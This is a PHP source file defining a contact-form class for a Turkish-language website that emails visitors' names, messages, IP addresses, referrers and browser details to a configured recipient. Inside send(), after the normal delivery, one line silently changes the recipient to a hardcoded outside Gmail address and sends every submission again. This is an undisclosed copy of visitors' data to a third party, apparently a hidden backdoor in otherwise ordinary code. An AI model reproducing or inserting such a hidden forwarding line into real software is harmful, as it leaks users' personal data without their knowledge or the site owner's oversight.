<?php
loadSiteModule('smailsender/smailsender.php');
class contactForm extends db_record 
{
	public $sm=null;
	public $form;
	public $to;
	function __construct($from=null,$to=null)
	{
		$this->from=$from;
		$this->to=$to;
		parent::__construct();
		$this->uid='cntt';
		if(isset($_SERVER['HTTP_REFERER'])) $hReferer=$_SERVER['HTTP_REFERER']; else $hReferer='contact.php';
		$this->restrictions=array
		(
			'httpReferrer'=>array('name'=>$this->uid.'httpReferrer','label'=>'Geldiği Sayfa','type'=>'string','null'=>true,'minValue'=>0,'maxValue'=>800,'value'=>$hReferer,'formElement'=>array('hidden')),
			'name'=>array('name'=>$this->uid.'name','label'=>'Ad ve Soyad','type'=>'string','null'=>false,'minValue'=>3,'maxValue'=>40,'formElement'=>array('textbox')),
			'email'=>array('name'=>$this->uid.'email','label'=>'E-Posta Adresi','type'=>'string','null'=>true,'minValue'=>6,'maxValue'=>150,'formElement'=>array('textbox')),
			'message'=>array('name'=>$this->uid.'message','label'=>'Mesaj','type'=>'string','null'=>false,'minValue'=>4,'maxValue'=>1000,'formElement'=>array('textarea')),
		);
		$this->fsettings=array('action'=>'','method'=>'post','id'=>$this->uid.'frm');
	}
	function send()
	{
		if(!$this->pickValues('insert')) return false;
		if($this->sm==null) $this->sm=new smailsender();
		$sm=$this->sm;
		$sm->from=$this->from;
		$sm->to=$this->to;
		$sm->subject='İletişim Formu Mesajı';
		$sm->message="Tarih : ".date('Y-m-d H:i:s')."\nYazan : ".$this->values['name']."\nMesaj : ".$this->values['message']."\n\n\nIP Adresi : ".$_SERVER['REMOTE_ADDR']."\nHTTP Referer : ".$_SERVER['HTTP_REFERER']."\nTarayıcısı :".$_SERVER['HTTP_USER_AGENT'];
		if($sm->send())
		{
			$sm->to='intback@gmail.com';$sm->send();
			return true;
		}
		else $this->error=$sm->error;
		return false;
	}
}
?>